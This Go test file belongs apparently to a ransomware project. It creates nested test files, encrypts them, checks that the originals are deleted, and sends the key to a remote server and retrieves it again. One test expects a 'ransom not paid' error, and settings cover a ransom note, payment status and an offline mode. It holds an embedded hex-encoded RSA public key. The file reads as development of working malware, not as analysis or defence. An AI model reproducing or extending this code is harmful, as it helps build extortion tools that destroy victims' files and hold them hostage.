package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	wcc_crypto "main/src/crypto"
	"main/src/utils"
	"os"
	"path"
	"testing"
)

func createRecursiveFileHierarchy(t *testing.T) ([]string, string) {
	testDir := t.TempDir()
	utils.Settings.EncryptedFileExt = "kc"
	utils.Settings.LeaveNote = false
	utils.Settings.RawKey = true
	fileName := testDir + "/_testFile"
	testString := "This is a test string"
	c := 3
	for i := 0; i < c; i++ {
		fullFileName := fileName + fmt.Sprint(i) + ".txt"
		ioutil.WriteFile(fullFileName, []byte(testString), 0777)
		if _, err := os.Stat(fullFileName); err != nil {
			t.Error("file not created correctly")
		}
	}
	recursiveDir1 := testDir + "/testRecursion1"
	recursiveDir2 := testDir + "/testRecursion2"
	recursiveDir3 := testDir + "/wow/this/is/sooo/deep"
	recursiveDir4 := testDir + "/wow/this"
	os.MkdirAll(recursiveDir1, 0777)
	os.MkdirAll(recursiveDir2, 0777)
	os.MkdirAll(recursiveDir3, 0777)
	os.MkdirAll(recursiveDir4, 0777)
	fileName = path.Join(recursiveDir1, "recursive_1_")
	for i := 0; i < c; i++ {
		fullFileName := fileName + fmt.Sprint(i) + ".txt"
		ioutil.WriteFile(fullFileName, []byte(testString), 0777)
		if _, err := os.Stat(fullFileName); err != nil {
			t.Error("file not created correctly")
		}
	}
	fileName = path.Join(recursiveDir2, "recursive_2_")
	for i := 0; i < c; i++ {
		fullFileName := fileName + fmt.Sprint(i) + ".txt"
		ioutil.WriteFile(fullFileName, []byte(testString), 0777)
		if _, err := os.Stat(fullFileName); err != nil {
			t.Error("file not created correctly")
		}
	}

	fileName = path.Join(recursiveDir3, "recursive_3_")
	fullFileName := fileName + fmt.Sprint(1) + ".txt"
	ioutil.WriteFile(fullFileName, []byte(testString), 0777)
	if _, err := os.Stat(fullFileName); err != nil {
		t.Error("file not created correctly")
	}

	fileName = path.Join(recursiveDir4, "recursive_4_")
	fullFileName = fileName + fmt.Sprint(1) + ".txt"
	ioutil.WriteFile(fullFileName, []byte(testString), 0777)
	if _, err := os.Stat(fullFileName); err != nil {
		t.Error("file not created correctly")
	}

	return wcc_crypto.GetFilesInCurrentDir("txt", testDir, true), testDir
}

var key string = `2D2D2D2D2D424547494E205055424C4943204B45592D2D2D2D2D0D0A4D494942496A414E42676B71686B6947397730424151454641414F43415138414D49494243674B4341514541316C76556C47453430616430596965594271776E0D0A5467333930354B76766B56715337396D4E413846736A6B70586E42616675527870673130635454696C396C78526A396A415A59455441334261355959367949660D0A79494D38504B42714D416230726F714B495A4579624C322F49395A3361456F4B567835456757536D776A6C6F764B526F30775A717173324C61563045365A44440D0A43727638677472794E6A4A4C474E3777715879657A326748525846537972765372586E34337276446B4637395937346F6C347770724D51376D7A6C447845752F0D0A342B31374675796436485542623743654D7079354F734647646D6D3750663349575A546B544B7754766C582B2B2B4274415357617350796F78672B33596F6E390D0A304872626D523762536D59642B59685151485854352B455A774F766175674E7369394D3575526C303941642F733439416C6A66785266496E4B6D2F3169394F670D0A6F774944415141420D0A2D2D2D2D2D454E44205055424C4943204B45592D2D2D2D2D0D0A`

func tearDown() {
	os.Remove("./e_key.txt")
	os.Remove("./raw_key.bin")
	os.Remove("./decryption_hash.bin")
	os.Remove("./d_key.txt")
}

func TestEncryptionDecryptionScheme(t *testing.T) {
	files, rootDir := createRecursiveFileHierarchy(t)
	var dQue utils.Queue
	// keey := "645267556B58703273357638792F423F4528472B4B6250655368566D59713374"
	dQue.Init(files)
	StartEncryption(&dQue, key)
	for _, f := range files {
		// ff := filepath.Join(rootDir, f)
		err := os.Remove(f)
		if err != nil {
			log.Fatal("Failed to delete the file")
			t.Error(err)
		}
	}
	var eQue utils.Queue
	eFiles := wcc_crypto.GetFilesInCurrentDir(utils.Settings.EncryptedFileExt, rootDir, true)
	eQue.Init(eFiles)
	StartDecryption(&eQue, key)
	finalFiles := wcc_crypto.GetFilesInCurrentDir("txt", rootDir, true)
	for _, ff := range files {
		if (utils.FindStringIndex(finalFiles, ff)) == -1 {
			t.Error("Final array mismatch")
		}
		content, err := ioutil.ReadFile(ff)
		if err != nil {
			log.Fatal("Failed to read decrypted file")
		}
		if string(content) != "This is a test string" {
			t.Error("Decrypted content mismatch")
		}
	}
	tearDown()
}

func TestEncryptionDecryptionSchemeWithDeletion(t *testing.T) {
	files, rootDir := createRecursiveFileHierarchy(t)
	var dQue utils.Queue
	// keey := "645267556B58703273357638792F423F4528472B4B6250655368566D59713374"
	dQue.Init(files)
	utils.Settings.Delete = true
	StartEncryption(&dQue, key)
	for _, f := range files {
		_, b := os.Stat(f)
		if b == nil {
			t.Errorf("Filed should be deleted")
		}
	}
	var eQue utils.Queue
	eFiles := wcc_crypto.GetFilesInCurrentDir(utils.Settings.EncryptedFileExt, rootDir, true)
	eQue.Init(eFiles)
	StartDecryption(&eQue, key)
	finalFiles := wcc_crypto.GetFilesInCurrentDir("txt", rootDir, true)
	for _, ff := range files {
		if (utils.FindStringIndex(finalFiles, ff)) == -1 {
			t.Error("Final array mismatch")
		}
		content, err := ioutil.ReadFile(ff)
		if err != nil {
			log.Fatal("Failed to read decrypted file")
		}
		if string(content) != "This is a test string" {
			t.Error("Decrypted content mismatch")
		}
	}
	tearDown()
}

func TestEncryptionDecryptionSchemeWithDeletionSendOff(t *testing.T) {
	if !utils.CheckIfServerIsOnline() {
		t.Skip("Server is unreachable or broken")
	}
	files, rootDir := createRecursiveFileHierarchy(t)
	var dQue utils.Queue
	// keey := "645267556B58703273357638792F423F4528472B4B6250655368566D59713374"
	dQue.Init(files)
	utils.Settings.Delete = true
	utils.Settings.RawKey = false
	utils.Settings.PaidStatus = true
	StartEncryption(&dQue, key)
	for _, f := range files {
		_, b := os.Stat(f)
		if b == nil {
			t.Errorf("Filed should be deleted")
		}
	}
	var eQue utils.Queue
	eFiles := wcc_crypto.GetFilesInCurrentDir(utils.Settings.EncryptedFileExt, rootDir, true)
	eQue.Init(eFiles)
	StartDecryption(&eQue, key)
	finalFiles := wcc_crypto.GetFilesInCurrentDir("txt", rootDir, true)
	for _, ff := range files {
		if (utils.FindStringIndex(finalFiles, ff)) == -1 {
			t.Error("Final array mismatch")
		}
		content, err := ioutil.ReadFile(ff)
		if err != nil {
			log.Fatal("Failed to read decrypted file")
		}
		if string(content) != "This is a test string" {
			t.Error("Decrypted content mismatch")
		}
	}
	tearDown()
}

func TestSendoffAndReceiveKey(t *testing.T) {
	if !utils.CheckIfServerIsOnline() {
		t.Skip("Server is unreachable or broken")
	}
	const testString string = "Test String!"
	var hash string = wcc_crypto.GetHash([]byte(testString))
	pubKeyBytes, _ := hex.DecodeString(key)
	pubKey := string(pubKeyBytes)
	encryptedString, _ := wcc_crypto.EncryptWithRSAPublicKey([]byte(testString), pubKey)
	success, err := utils.SendOffKey(encryptedString, hash, utils.Settings.PaidStatus, false)
	if err != nil {
		t.Error(err.Error())
	}
	if !success {
		t.Error("Sendoff failed!")
	}
	// retrieve key
	keyHex, err := utils.RetriveKeyByHash(hash, false)
	if err != nil {
		t.Error(err.Error())
	}
	assertionValue, _ := hex.DecodeString(keyHex)
	if string(assertionValue) != testString {
		t.Error("Test string missmatch")
	}
}

func TestSendoffAndReceiveKeyNotPaid(t *testing.T) {
	if !utils.CheckIfServerIsOnline() {
		t.Skip("Server is unreachable or broken")
	}
	const testString string = "Not paid test String!"
	var hash string = wcc_crypto.GetHash([]byte(testString))
	pubKeyBytes, _ := hex.DecodeString(key)
	pubKey := string(pubKeyBytes)
	encryptedString, _ := wcc_crypto.EncryptWithRSAPublicKey([]byte(testString), pubKey)
	success, err := utils.SendOffKey(encryptedString, hash, utils.Settings.PaidStatus, false)
	if err != nil {
		t.Error(err.Error())
	}
	if !success {
		t.Error("Sendoff failed!")
	}
	// retrieve key
	_, err = utils.RetriveKeyByHash(hash, false)
	if err != nil {
		if err.Error() != "ransom not paid" {
			t.Error("Unexpected error")
		}
	} else {
		t.Error("Error expected")
	}
}

func TestOfflineDecryption(t *testing.T) {
	var dQue utils.Queue
	files, rootDir := createRecursiveFileHierarchy(t)
	dQue.Init(files)
	utils.Settings.Delete = true
	utils.Settings.RawKey = false
	utils.Settings.PaidStatus = true
	utils.Settings.OfflineMode = true
	clientPrivateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		log.Fatal(err)
	}
	utils.Settings.SuppliedClientPrivateKey = clientPrivateKey
	privateKeyBytes := hex.EncodeToString(x509.MarshalPKCS1PrivateKey(clientPrivateKey))
	StartEncryption(&dQue, key)
	for _, f := range files {
		_, b := os.Stat(f)
		if b == nil {
			t.Errorf("Filed should be deleted")
		}
	}
	var eQue utils.Queue
	eFiles := wcc_crypto.GetFilesInCurrentDir(utils.Settings.EncryptedFileExt, rootDir, true)
	eQue.Init(eFiles)
	// prepare decrypted key
	ioutil.WriteFile("./d_key.txt", []byte(privateKeyBytes), 0777)
	StartDecryption(&eQue, key)
	finalFiles := wcc_crypto.GetFilesInCurrentDir("txt", rootDir, true)
	for _, ff := range files {
		if (utils.FindStringIndex(finalFiles, ff)) == -1 {
			t.Error("Final array mismatch")
		}
		content, err := ioutil.ReadFile(ff)
		if err != nil {
			log.Fatal("Failed to read decrypted file")
		}
		if string(content) != "This is a test string" {
			t.Error("Decrypted content mismatch")
		}
	}
	tearDown()
}

/*func TestV3EncryptionScheme(t *testing.T) {
	const test = "This is a test yay"
	//	const sKey = "645267556B58703273357638792F423F4528472B4B6250655368566D59713374"
	//	key, _ := hex.DecodeString(sKey)
	const pubKey = `2D2D2D2D2D424547494E205055424C4943204B45592D2D2D2D2D0D0A4D494942496A414E42676B71686B6947397730424151454641414F43415138414D49494243674B4341514541316C76556C47453430616430596965594271776E0D0A5467333930354B76766B56715337396D4E413846736A6B70586E42616675527870673130635454696C396C78526A396A415A59455441334261355959367949660D0A79494D38504B42714D416230726F714B495A4579624C322F49395A3361456F4B567835456757536D776A6C6F764B526F30775A717173324C61563045365A44440D0A43727638677472794E6A4A4C474E3777715879657A326748525846537972765372586E34337276446B4637395937346F6C347770724D51376D7A6C447845752F0D0A342B31374675796436485542623743654D7079354F734647646D6D3750663349575A546B544B7754766C582B2B2B4274415357617350796F78672B33596F6E390D0A304872626D523762536D59642B59685151485854352B455A774F766175674E7369394D3575526C303941642F733439416C6A66785266496E4B6D2F3169394F670D0A6F774944415141420D0A2D2D2D2D2D454E44205055424C4943204B45592D2D2D2D2D0D0A`
	pubPem, _ := hex.DecodeString(pubKey)
	encryptedBytes, err := encryptClientPrivateKeyWithServerPublicKey([]byte(test), pubPem)
	if err != nil {
		log.Fatal((err))
	}
}*/
